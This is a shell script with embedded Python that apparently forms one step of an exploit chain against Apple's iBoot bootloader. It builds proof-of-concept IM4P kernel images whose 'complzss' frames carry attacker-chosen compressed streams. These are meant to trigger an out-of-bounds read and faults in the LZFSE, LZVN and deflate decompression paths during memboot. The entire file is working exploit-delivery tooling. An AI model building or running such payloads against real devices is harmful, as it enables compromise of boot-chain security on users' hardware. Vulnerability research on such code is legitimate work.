#!/bin/bash
# step6_wrap_complzss.sh — Build PoC IM4Ps with the REAL iBoot compression FRAME so the
# memboot path actually routes the payload through the decompression dispatcher.
# Observed frame (from `ipsw img4 im4p create --compress lzss` DER dump):
#   DATA = 'complzss' | algo4cc | u32le out_size | u32le comp_size | <stream> ...
# We splice OUR attacker-chosen stream verbatim and set algo4cc per report.
# algo4cc mapping (verify against step2 control behavior on-device; candidates from the
# dispatcher id space, DELIVERY_PATHS §0): lzfse='lzse', lzvn='lzvn', deflate='defh'?? ->
# we emit the ipsw-observed 4cc bytes for each algorithm name and LOG the choice.
set -eu
cd "$(dirname "$0")"
OUT="results/step6_$(date +%Y%m%d_%H%M%S).log"; mkdir -p results
python3 - <<'EOF'
import struct, subprocess, os
def der_im4p(type4cc, desc, data_octets):
    def enc_len(n): return bytes([n]) if n<0x80 else bytes([0x80|len(n.to_bytes(4,'big'))])+n.to_bytes(4 if n>0xffff else 2,'big')
    def oct(b): return b'\x04'+enc_len(len(b))+b
    def ia5(b): return b'\x16'+enc_len(len(b))+b
    body = ia5(b'IM4P')+ia5(type4cc)+ia5(desc)+oct(data_octets)
    seq  = b'\x30'+enc_len(len(body))+body
    return seq
def frame(algo4cc, stream, out_size):
    return b'complzss'+algo4cc+struct.pack('<II', out_size, len(stream))+stream
# (algo4cc, out_size_guess, file, label)
JOBS=[
 (b'lzse', 16384, 'poc_205_stored.bin',      'R1_DEFLATE'),   # id 0x205
 (b'lzvn', 65536+1024, 'poc_v0.bin',         'R2_LZVN'),      # id 0x100/0x101
 (b'lzse', 0x8000, 'poc_lzfse_oobread.bin',  'R3_LZFSELEAK'), # bvx1 magic self-identifies
 (b'lzse', 0x8000, 'poc_lzfse_fault.bin',    'R3_LZFSEFAULT'),
]
for algo, outsz, f, label in JOBS:
    s=open(f,'rb').read()
    im4p=der_im4p(b'krnl', b'PoC-'+label.encode(), frame(algo, s, outsz))
    name='frame_'+label.lower()+'.im4p'
    open(name,'wb').write(im4p)
    print(f'{name}: {len(im4p)} B (stream {len(s)} B, algo {algo!r}, decl-out {outsz})')
print('NOTE: control_krnl.im4p already exists (real bvx2 stream; dispatcher self-sniffs bvx magic)')
EOF
